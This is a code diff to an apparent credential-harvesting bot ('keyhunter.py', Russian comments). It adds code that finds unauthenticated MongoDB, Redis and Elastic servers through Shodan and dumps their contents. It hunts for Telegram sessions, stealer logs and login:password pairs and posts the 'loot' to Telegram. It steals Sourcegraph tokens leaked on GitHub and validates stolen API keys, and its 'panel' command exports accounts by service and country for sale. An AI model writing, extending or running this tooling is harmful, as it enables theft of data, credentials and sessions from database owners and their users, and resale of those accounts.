+        out["alive"] = True
+        out["version"] = str(hello.get("version") or "?")
+        ld = _mongo_cmd(sock, {"listDatabases": 1, "$db": "admin"})
+        if ld.get("ok") not in (1, 1.0):
+            err = str(ld.get("errmsg") or "").lower()
+            if (
+                ld.get("code") in (13, 18)
+                or "not author" in err
+                or "authenticat" in err
+            ):
+                out["auth_required"] = True
+            sock.close()
+            return out
+        dbs = [
+            (d.get("name"), d.get("sizeOnDisk") or 0)
+            for d in (ld.get("databases") or [])
+            if isinstance(d, dict)
+        ]
+        dbs = [(n, s) for n, s in dbs if n and n not in ("admin", "local", "config")]
+        dbs.sort(key=lambda x: -(x[1] if isinstance(x[1], (int, float)) else 0))
+        out["dbs"] = dbs[:10]
+        juicy = []
+        for name, _sz in dbs[:max_dbs]:
+            lc = _mongo_cmd(sock, {"listCollections": 1, "$db": name})
+            colls = []
+            cur = lc.get("cursor") or {}
+            if isinstance(cur, dict):
+                for c in (cur.get("firstBatch") or [])[:15]:
+                    if isinstance(c, dict) and c.get("name"):
+                        colls.append(str(c["name"]))
+            out["colls"][name] = colls
+            for cn in colls[:2]:
+                try:
+                    fr = _mongo_cmd(
+                        sock, {"find": cn, "limit": 2, "batchSize": 2, "$db": name}
+                    )
+                    fcur = fr.get("cursor") or {}
+                    if not isinstance(fcur, dict):
+                        continue
+                    for doc in (fcur.get("firstBatch") or [])[:2]:
+                        ds = json.dumps(doc, ensure_ascii=False, default=str)[:800]
+                        out["samples"].append("%s.%s: %s" % (name, cn, ds[:300]))
+                        for kd, snip in _odb_classify(ds, cn):
+                            juicy.append((kd, "%s.%s" % (name, cn), snip))
+                except Exception:
+                    continue
+        out["juicy"] = juicy[:15]
+        sock.close()
+        return out
+    except Exception:
+        try:
+            sock.close()
+        except Exception:
+            pass
+        return out if out["alive"] else None
+
+
 def opendb_sweep(cycle):
     """🗄️ OPEN-DB: открытые Elastic/Mongo/Redis/Couch по shodan — это СЫРЫЕ
     ДАМПЫ (индексы/базы с токенами внутри). Elastic: список индексов + сэмпл
-    документов -> экстрактор -> валидация -> TG. Redis: PING без AUTH.
+    документов -> экстрактор -> валидация -> TG. Redis/Mongo: глубокий дамп
+    (см. _redis_deep_dump/_mongo_deep_probe) — пост только с инфой/лутом.
     Раз в 2 цикла, 2 запроса к shodan за свип (бережём кредиты)."""
     if cycle % 2:
         return []
@@ -15471,6 +16532,11 @@ def opendb_sweep(cycle):
         ('port:27017 "MongoDB"', "mongo"),
         ('port:6379 "redis_version"', "redis"),
         ('port:5984 "couchdb"', "couch"),
+        # TG-коллекции: в открытых базах лежат userbot-сессии/аккаунты строкой
+        ('port:27017 "telegram"', "mongo"),
+        ('port:9200 "telegram"', "elastic"),
+        ('port:27017 "stealer"', "mongo"),
+        ('port:9200 "session"', "elastic"),
     )
     hosts, seen_h = [], set()
     rot = (cycle // 2) % len(QUERIES)
@@ -15533,7 +16599,19 @@ def opendb_sweep(cycle):
                     (i for i in idxs if str(i.get("docs.count", "")).isdigit()),
                     key=lambda x: -int(x.get("docs.count") or 0),
                 )
-                for i in fat[:2]:
+                # TG/session/stealer-индексы вперёд: в них сессии и аккаунты
+                tgish = [
+                    i
+                    for i in fat
+                    if re.search(
+                        r"(tg|tele|session|account|stealer|creds?|user)",
+                        str(i.get("index", "")),
+                        re.I,
+                    )
+                ]
+                if tgish:
+                    fat = tgish + [i for i in fat if i not in tgish]
+                for i in fat[:3]:
                     nm = i.get("index")
                     if not nm or str(nm).startswith("."):
                         continue
@@ -15576,67 +16654,91 @@ def opendb_sweep(cycle):
                     return chunks
                 return []
             if kind == "redis":
-                import socket as _sock
-
-                s = _sock.create_connection((ip, port), timeout=4)
-                s.sendall(b"*1\r\n$4\r\nPING\r\n")
-                resp = s.recv(64)
-                if b"PONG" in resp:
-                    _odb_seen[hid] = time.time()
-                    s.sendall(b"*1\r\n$4\r\nINFO\r\n")
-                    # INFO может быть большим — читаем до конца передачи
-                    chunks_r = []
-                    s.settimeout(3)
-                    try:
-                        while True:
-                            part = s.recv(16384)
-                            if not part:
-                                break
-                            chunks_r.append(part)
-                            if sum(len(c) for c in chunks_r) > 65536:
-                                break
-                    except Exception:
-                        pass
-                    info = b"".join(chunks_r).decode("utf-8", errors="replace")
-                    kn = re.findall(r"db\d+:keys=(\d+)", info)
-                    if fresh:
-                        post_telegram(
-                            "🗄️ OPEN REDIS %s:%s (no auth) — ключей: %s"
-                            % (ip, port, sum(map(int, kn)) if kn else "?")
+                # глубокий дамп: INFO -> SCAN -> TYPE/GET/HGETALL (см. хелпер).
+                # Было: regex-разбор SCAN (хватал курсор как ключ), только
+                # стринги, 5 ключей, пост ДО анализа = спам "ключей: ?".
+                d = _redis_deep_dump(ip, port)
+                if not d:
+                    return []
+                _odb_seen[hid] = time.time()
+                if d["miner"]:
+                    # занято майнер-дроппером (xmr_cron/backup*) — лута нет,
+                    # хозяин машины чужой. в TG не постим вообще.
+                    log("  🗄️ redis %s — занят майнером, пропуск" % hid)
+                    return []
+                chunks = []
+                if d["samples"]:
+                    chunks.append(
+                        (
+                            "\n".join(
+                                "%s [%s] = %s" % (k, t, v) for k, t, v in d["samples"]
+                            ),
+                            "opendb:redis:%s" % hid,
                         )
-                    # сэмплим ключи: redis кэширует сессии/токены в значениях
-                    try:
-                        s.sendall(b"*2\r\n$4\r\nSCAN\r\n$1\r\n0\r\n")
-                        time.sleep(0.3)
-                        scan = s.recv(65536).decode("utf-8", errors="replace")
-                        keys_found = re.findall(
-                            r"\r\n\$[0-9]+\r\n([^\r\n]{3,80})", scan
-                        )
-                        vals = []
-                        for rk in keys_found[:5]:
-                            kb = rk.encode("utf-8", "replace")
-                            s.sendall(
-                                b"*2\r\n$3\r\nGET\r\n$%d\r\n%s\r\n" % (len(kb), kb)
+                    )
+                # пост только если есть лут ИЛИ база непустая (>=5 ключей)
+                if fresh and (d["juicy"] or d["keys_total"] >= 5):
+                    msg = [
+                        "🗄️ REDIS %s (v%s) — ключей: %d, сэмпл: %d"
+                        % (hid, d["version"], d["keys_total"], d["n_sampled"])
+                    ]
+                    if d["juicy"]:
+                        msg.append(
+                            "🔥 ЛУТ: "
+                            + ", ".join(
+                                "%s×%d" % (kd, sum(1 for j in d["juicy"] if j[0] == kd))
+                                for kd in dict.fromkeys(j[0] for j in d["juicy"])
                             )
-                            time.sleep(0.2)
-                            vals.append(s.recv(8192).decode("utf-8", "replace"))
-                        if vals:
-                            s.close()
-                            return [("\n".join(vals), "opendb:redis:%s" % hid)]
-                    except Exception:
-                        pass
-                s.close()
-                return []
+                        )
+                        for kd, k, snip in d["juicy"][:6]:
+                            msg.append("  ▪ [%s] %s = %s" % (kd, k[:40], snip[:80]))
+                    else:
+                        for k, t, v in d["samples"][:5]:
+                            msg.append("  ▪ %s [%s] = %s" % (k[:40], t, v[:80]))
+                    post_telegram("\n".join(msg))
+                return chunks
             if kind == "mongo":
-                # настоящая проверка: mongo отвечает на HTTP GET / знаменитой
-                # заглушкой (было: голый TCP-connect = любой открытый порт
-                # постился как "OPEN MONGO")
-                r = requests.get(base + "/", timeout=(3, 6), verify=False)
-                if "MongoDB" in (r.text or ""):
+                # настоящий wire protocol: hello -> listDatabases -> сэмпл.
+                # Было: HTTP-заглушка (у современных монг её нет = мимо) и
+                # пост БЕЗ единой строчки инфы о содержимом.
+                d = _mongo_deep_probe(ip, port)
+                if not d or not d.get("alive"):
+                    return []
+                if d.get("auth_required"):
                     _odb_seen[hid] = time.time()
-                    if fresh:
-                        post_telegram("🗄️ OPEN MONGO %s:%s (http stub ok)" % (ip, port))
-                return []
+                    log("  🗄️ mongo %s — требует auth, пропуск" % hid)
+                    return []
+                if not d["dbs"]:
+                    return []  # пустая монга — не находка
+                _odb_seen[hid] = time.time()
+                chunks = [(s, "opendb:mongo:%s" % hid) for s in d["samples"]]
+                if fresh:
+                    msg = [
+                        "🗄️ MONGO %s (v%s) — AUTHLESS, баз: %d"
+                        % (hid, d["version"], len(d["dbs"]))
+                    ]
+                    msg.append(
+                        "  Базы: "
+                        + ", ".join(
+                            "%s (%.1fMB)" % (n, (s or 0) / 1048576.0)
+                            for n, s in d["dbs"][:8]
+                        )
+                    )
+                    for dbn, colls in list(d["colls"].items())[:3]:
+                        if colls:
+                            msg.append("  📁 %s: %s" % (dbn, ", ".join(colls[:8])))
+                    if d["juicy"]:
+                        msg.append(
+                            "🔥 ЛУТ: "
+                            + ", ".join(
+                                "%s×%d" % (kd, sum(1 for j in d["juicy"] if j[0] == kd))
+                                for kd in dict.fromkeys(j[0] for j in d["juicy"])
+                            )
+                        )
+                        for kd, k, snip in d["juicy"][:5]:
+                            msg.append("  ▪ [%s] %s = %s" % (kd, k[:40], snip[:80]))
+                    post_telegram("\n".join(msg))
+                return chunks
         except Exception:
             return []
 
@@ -15644,6 +16746,39 @@ def opendb_sweep(cycle):
         for chunks in ex.map(probe, hosts):
             if chunks:
                 out.extend(chunks)
+
+    # 📦 LOGHUNTER-мост: сырые дампы БД — это email:pass/сессии/токены.
+    # Экстрактор ключей их не берёт (это не API-ключи) — отдаём loghunter'у:
+    # parse_db_docs выцепляет пары login:password из JSON-документов.
+    try:
+        import loghunter as _LH  # type: ignore
+
+        _lh_acc, _lh_sess = [], []
+        for _txt, _org in out:
+            _lh_acc.extend(_LH.parse_db_docs(_txt, _org))
+            _lh_acc.extend(_LH.parse_ulp_text(_txt, _org))
+            _lh_sess.extend(_LH.parse_tg_sessions(_txt, _org))
+        if _lh_acc or _lh_sess:
+            _hs = _LH.load_acc_hashes()
+            _new = _LH.store_accounts(_lh_acc + _lh_sess, _hs)
+            if _new:
+                _n_tg = sum(1 for a in _lh_sess if a.get("type") == "tgsession")
+                log(
+                    "  🗄️ opendb->loghunter: +%d аккаунтов, +%d TG-сессий"
+                    % (_new, _n_tg)
+                )
+                _LH.tg_post(
+                    "🗄️ OPEN-DB: +%d аккаунтов, +%d TG-сессий из открытых баз (%s)"
+                    % (
+                        _new,
+                        _n_tg,
+                        ", ".join(sorted({a.get("service", "?") for a in _lh_acc})[:6]),
+                    )
+                )
+    except ImportError:
+        pass
+    except Exception as _e:
+        log("  opendb->loghunter err: %s" % _e)
 
     # мини-пайплайн: сэмплы -> экстрактор -> приоритетная валидация -> стор/TG
     try:
@@ -15845,8 +16980,91 @@ def self_keysmith(cycle):
     конфигов, валидирует боевым запросом и вписывает себе. fofa — в конфиг,
     shodan — в пул лейнов (каждый ключ = +своя квота кредитов к impact'у)."""
     _keysmith_fofa(cycle)
+    _keysmith_sourcegraph(cycle)
     # _keysmith_shodan ВЫКЛ: чужие шодан-ключи не нужны — edu-пула (193k/мес)
     # хватает на полный impact. Функция оставлена: включить, если пул иссякнет.
+
+
+def _keysmith_sourcegraph(cycle):
+    """🌐 SOURCEGRAPH-ТОКЕНЫ (sgp_...): глобальный код-поиск по ВСЕМ форджам —
+    без токена источник 'sourcegraph' мёртв (403 auth required). Токены утекают
+    в .env/CI-конфигах. Боевой чек: /.api/search/stream 200 = токен живой ->
+    вписываем в конфиг, источник оживает. Раз в 6 циклов, пока пусто."""
+    if cycle % 6 != 2:
+        return
+    if CFG.get("sourcegraph_token"):
+        return  # уже есть
+    try:
+        tok = gh_token()
+        if not tok:
+            return
+        found = []
+        for q in (
+            '"SOURCEGRAPH_TOKEN" extension:env',
+            '"SG_TOKEN" sgp_ extension:yml',
+            'sgp_ "sourcegraph" extension:env',
+        ):
+            try:
+                r = requests.get(
+                    "https://api.github.com/search/code",
+                    params={"q": q, "per_page": 10, "sort": "indexed"},
+                    headers={
+                        "Authorization": "Bearer " + tok,
+                        "Accept": "application/vnd.github+json",
+                    },
+                    timeout=(8, 20),
+                )
+            except Exception:
+                continue
+            if r.status_code != 200:
+                continue
+            for item in r.json().get("items", []):
+                m = re.match(
+                    r"https://github\.com/([^/]+/[^/]+)/blob/([^/]+)/(.+)",
+                    item.get("html_url", ""),
+                )
+                if not m:
+                    continue
+                try:
+                    rr = requests.get(
+                        "https://raw.githubusercontent.com/%s/%s/%s" % m.groups(),
+                        timeout=(6, 15),
+                        verify=False,
+                    )
+                except Exception:
+                    continue
+                if rr.status_code != 200:
+                    continue
+                for k in set(re.findall(r"sgp_[A-Za-z0-9]{20,80}", rr.text)):
+                    found.append(k)
+        for k in found[:8]:
+            try:
+                vr = http(
+                    "GET",
+                    "https://sourcegraph.com/.api/search/stream?q=context:global+anthropic&display=1",
+                    timeout=(8, 15),
+                    headers={"Authorization": "token " + k},
+                )
+                if vr is not None and vr.status_code == 200:
+                    CFG["sourcegraph_token"] = k
+                    try:
+                        cfg2 = json.load(open(CONFIG_PATH, encoding="utf-8"))
+                        cfg2["sourcegraph_token"] = k
+                        _atomic_json_dump(CONFIG_PATH, cfg2, indent=2)
+                    except Exception:
+                        pass
+                    log(
+                        "  🔑 KEYSMITH: sourcegraph токен добыт (%s…), источник оживлён"
+                        % k[:12]
+                    )
+                    post_telegram(
+                        "🔑 KEYSMITH: sourcegraph токен добыт — глобальный код-поиск жив"
+                    )
+                    return
+            except Exception:
+                continue
+    except Exception:
+        pass
 
 
 def _keysmith_fofa(cycle):
@@ -15913,12 +17131,7 @@ def _keysmith_fofa(cycle):
                 if vr.status_code == 200 and not j.get("error"):
                     CFG["fofa_email"] = email
                     CFG["fofa_key"] = key
-                    json.dump(
-                        CFG,
-                        open(CONFIG_PATH, "w", encoding="utf-8"),
-                        ensure_ascii=False,
-                        indent=2,
-                    )
+                    _atomic_json_dump(CONFIG_PATH, CFG, indent=2)
                     log("  🔑 KEYSMITH: fofa пара найдена и вписана (%s)" % email)
                     post_telegram(
                         "🔑 KEYSMITH: бот сам добыл fofa-ключ (%s) — источник оживлён"
@@ -16039,6 +17252,33 @@ def run_once(extra_paths=(), post=True):
     t0 = time.time()
     reset_board_health()  # сброс кэша недоступных бордов на новый цикл
     chunks = run_sources(extra_paths)
+    # 📥 TG-чат бота как источник: dj шлёт ключи напрямую
+    try:
+        _tg_chunks = tg_ingest_keys()
+        if _tg_chunks:
+            chunks.extend(_tg_chunks)
+            log("  [tg-ingest     ] %d chunks" % len(_tg_chunks))
+    except Exception:
+        pass
+    # 📦 LOGHUNTER: стилер-логи/комбо/сессии из тех же чанков (модуль рядом)
+    try:
+        import loghunter as _LH  # type: ignore
+
+        _lh = _LH.lh_sweep(chunks=chunks, post=post, max_files=8)
+        if _lh and (_lh.get("accounts") or _lh.get("archives")):
+            log(
+                "  [loghunter     ] acc:%d sess:%d new:%d архивов:%d"
+                % (
+                    _lh.get("accounts", 0),
+                    _lh.get("sessions", 0),
+                    _lh.get("new", 0),
+                    _lh.get("archives", 0),
+                )
+            )
+    except ImportError:
+        pass
+    except Exception as _lhe:
+        log("  loghunter err: %s" % _lhe)
     log("=== EXTRACT ===")
     seen = load_seen()
     try:
@@ -16086,9 +17326,7 @@ def run_once(extra_paths=(), post=True):
                 continue
             candidates[h] = (key, tag, base, origin)
             # track which source yielded this candidate
-            origin_name = (
-                str(origin).split(":")[0] if ":" in str(origin) else str(origin)
-            )
+            origin_name = _origin_bucket(origin)
             source_yields[origin_name] = source_yields.get(origin_name, 0) + 1
         # 🧬 ЭВОЛЮЦИЯ: горячий файл (дал кандидатов) -> учим новые имена
         if _cands_here:
@@ -16177,7 +17415,7 @@ def run_once(extra_paths=(), post=True):
     found = []
     t_validate = time.time()
     VALIDATE_BUDGET = int(
-        CFG.get("validate_budget", 1500)
+        CFG.get("validate_budget", 600)
     )  # сек: хвост skgen-хлама не растягивает цикл вечно (хостед: меньше, чтобы влезать в cron-окно)
     # попытки для unverified (сеть) — ретрай до 3 раз, потом в seen
     attempts_path = os.path.join(HERE, "keyhunter_attempts.json")
@@ -16202,7 +17440,11 @@ def run_once(extra_paths=(), post=True):
                 )
                 break
             # ПРИОРИТЕТ ВАЛИДАЦИИ: anthropic/подписки/деньги — первыми,
-            # skgen/sk20/hex-хлам — в хвост (чтобы жир не ждал за мусором)
+            # skgen/sk20/hex-хлам — в хвост (чтобы жир не ждал за мусором).
+            # АУДИТ-фикс 2026-09-12: теги без LLM-выгоды (tg-bot, instagram,
+            # slack, shopify, npm, figma, twilio, linear, discord-шум) —
+            # в САМЫЙ хвост: валидируются только если бюджет остался после
+            # всего жирного. Каждый tg-bot жёг ~5с воркера за ноль пользы.
             TAG_PRIO = {
                 "anthropic": 0,
                 "anthropic-refresh": 0,
@@ -16225,7 +17467,6 @@ def run_once(extra_paths=(), post=True):
                 "airtable": 2,
                 "notion": 2,
                 "sendgrid": 2,
-                "tg-bot": 2,
                 "modelscope": 2,
                 "huggingface": 2,
                 "minimax": 2,
@@ -16270,12 +17511,12 @@ def run_once(extra_paths=(), post=True):
                 "supabase": 1,
                 "aws": 1,
                 "zhipu": 1,
-                "slack": 2,
+                "slack": 8,
                 "github-token": 2,
                 "gocspx": 2,
                 "laravel-appkey": 2,
-                "twilio": 2,
-                "shopify": 2,
+                "twilio": 8,
+                "shopify": 8,
                 "baseten": 2,
                 "replicate": 2,
                 "email-cred": 3,
@@ -16285,6 +17526,17 @@ def run_once(extra_paths=(), post=True):
                 "sk20": 8,
                 "bearer": 8,
                 "hex32": 9,
+                # не-LLM шум: tg-bot/instagram/figma/linear/npm — за мусором.
+                # Бюджет до них доходит только если всё остальное проверено.
+                "tg-bot": 9,
+                "instagram": 9,
+                "figma": 9,
+                "linear": 9,
+                "npm": 9,
+                "roblox": 9,
+                "steam": 9,
+                "x-session": 9,
+                "sentry": 9,
             }
             pending = dict(
                 sorted(pending.items(), key=lambda kv: TAG_PRIO.get(kv[1][1], 5))
@@ -16626,10 +17878,8 @@ def env_smtp_sweep(cycle=0):
         # храним не больше 2000 хостов
         if len(seen_hosts) > 2000:
             seen_hosts = dict(sorted(seen_hosts.items(), key=lambda kv: -kv[1])[:2000])
-        json.dump(
-            seen_hosts,
-            open(os.path.join(HERE, "env_smtp_seen.json"), "w", encoding="utf-8"),
-        )
+        # АУДИТ-фикс: атомарно
+        _atomic_json_dump(os.path.join(HERE, "env_smtp_seen.json"), seen_hosts)
     except Exception:
         pass
     # персистим хэши рабочих находок в seen (было: не сохранялись -> после
@@ -16993,8 +18243,11 @@ def cmd_validate(base, key):
 
 def cmd_sources():
     log("источники:")
-    for cls in ALL_SOURCE_CLASSES:
-        s = cls()
+    # АУДИТ-фикс 2026-09-13: _build_all_sources() возвращает ИНСТАНСЫ
+    # (sources = [cls() for cls in ...]) — повторный вызов cls() по инстансу
+    # давал TypeError: 'Gists' object is not callable. Команда sources была
+    # мертва (падала на первом же источнике).
+    for s in _build_all_sources():
         note = ""
         if s.name == "github-code" and not gh_token():
             note = "(нужен github_token)"
@@ -17121,6 +18374,8 @@ def main():
             "recheck",
             "sources",
             "ato",
+            "logs",
+            "panel",
         ],
     )
     ap.add_argument("--every", type=int, default=None)
@@ -17139,6 +18394,24 @@ def main():
 
     if args.cmd == "sources":
         cmd_sources()
+    elif args.cmd == "logs":
+        # 📦 стилер-логи/комбо/сессии: отдельный проход loghunter по своим источникам
+        try:
+            import loghunter as _LH  # type: ignore
+
+            res = _LH.lh_sweep()
+            log("LOGHUNTER: %s" % json.dumps(res, ensure_ascii=False))
+        except ImportError:
+            log("loghunter.py не найден рядом с keyhunter.py")
+    elif args.cmd == "panel":
+        # продажный экспорт: panel/<service>/<country>.txt + index.json
+        try:
+            import loghunter as _LH  # type: ignore
+
+            idx = _LH.panel()
+            log("PANEL: %s" % json.dumps(idx, ensure_ascii=False)[:600])
+        except ImportError:
+            log("loghunter.py не найден рядом с keyhunter.py")
     elif args.cmd == "validate":
         if not (args.base and args.key):
             log("usage: keyhunter.py validate --base URL --key KEY")
@@ -17167,17 +18440,9 @@ def main():
             log("🔬 DEEP MODE: gist pagination x30")
         run_once(post=not args.no_post)
     elif args.cmd in ("monitor", "loop"):
-        # ротация лога: >5MB -> оставляем последний 1MB (иначе недели роста
-        # съедят диск и замедлят tail)
-        try:
-            if os.path.getsize(LOG_PATH) > 5_000_000:
-                with open(LOG_PATH, "rb") as f:
-                    f.seek(-1_000_000, os.SEEK_END)
-                    tail = f.read()
-                with open(LOG_PATH, "wb") as f:
-                    f.write(b"... rotated ...\n" + tail)
-        except Exception:
-            pass
+        # ротация лога: >5MB -> оставляем последний 1MB. Через _rotate_log —
+        # handle _LOG_FH закрывается ДО усечения, иначе NUL-gap.
+        _rotate_log()
         log("🔔 MONITOR: проход каждые %ds. Ctrl+C — стоп." % every)
         log("   автодроп находок: %s" % DESKTOP_DROP)
         log("   TG-постинг: включён (бот ждёт /start для захвата chat_id)")
@@ -17197,6 +18462,7 @@ def main():
             cycle += 1
             global CYCLE_COUNTER
             CYCLE_COUNTER = cycle
+            _rotate_log()  # рост внутри одного процесса тоже режем
             log(
                 "──── цикл #%d %s ────"
                 % (cycle, datetime.datetime.now().strftime("%H:%M:%S"))
